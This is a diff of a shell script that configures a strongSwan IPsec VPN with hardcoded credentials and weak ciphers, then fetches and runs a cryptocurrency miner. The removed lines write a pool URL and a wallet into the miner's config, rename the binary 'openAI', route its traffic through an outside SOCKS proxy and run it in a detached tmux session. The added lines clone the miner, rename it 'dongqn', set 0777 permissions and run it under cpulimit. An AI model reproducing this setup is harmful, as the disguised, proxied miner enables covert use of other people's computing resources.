@@ -7,17 +7,12 @@ VPN_USER='quangvu'
 VPN_PASSWORD='quangvu'
 cat > /etc/ipsec.conf <<EOF
 # ipsec.conf - strongSwan IPsec configuration file
-
 # basic configuration
-
 config setup
   # strictcrlpolicy=yes
   # uniqueids = no
-
 # Add connections here.
-
 # Sample VPN connections
-
 conn %default
   ikelifetime=60m
   keylife=20m
@@ -27,7 +22,6 @@ conn %default
   authby=secret
   ike=aes128-sha1-modp1024,3des-sha1-modp1024!
   esp=aes128-sha1-modp1024,3des-sha1-modp1024!
-
 conn myvpn
   keyexchange=ikev1
   left=%defaultroute
@@ -86,22 +80,9 @@ route add 117.7.81.138 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com/ > ip.txt
 
-wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.5_ubuntu16_server.tar.gz
-tar -zxf ariocppminer_v0.9.5_ubuntu16_server.tar.gz
-echo "pool
-http://aropool.com/
-47VJTSocAAVkfoJ2o2fW4bQiiukiiAFNvWPsCfgcWZ5FZthq7HJxBMHo9rRe8jvRfSireoZYLJGWY2GTaYWs4M54
-`nproc`
-enhanced
-true
-`hostname`" > config.cfg
-
-
-mv ariocppminer_avx2 openAI
-sed -i 's/192.168.0.0/0.0.0.0/g' /etc/tsocks.conf
-sed -i 's/255.255.255.0/0.0.0.0/g' /etc/tsocks.conf
-sed -i 's/192.168.0.1/173.242.121.53/g' /etc/tsocks.conf
-sed -i 's/server_port = 1080/server_port = 9080/g' /etc/tsocks.conf
-sed -i 's/server_type = 4/server_type = 5/g' /etc/tsocks.conf
-
-tsocks tmux new-session -d -s my_session1 './openAI'
+sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
+git clone https://github.com/quangvu1602/ariocppminer
+cd ariocppminer
+mv ariocppminer_avx2 dongqn
+chmod 0777 dongqn
+cpulimit --exe dongqn --limit 320 -b && ./dongqn
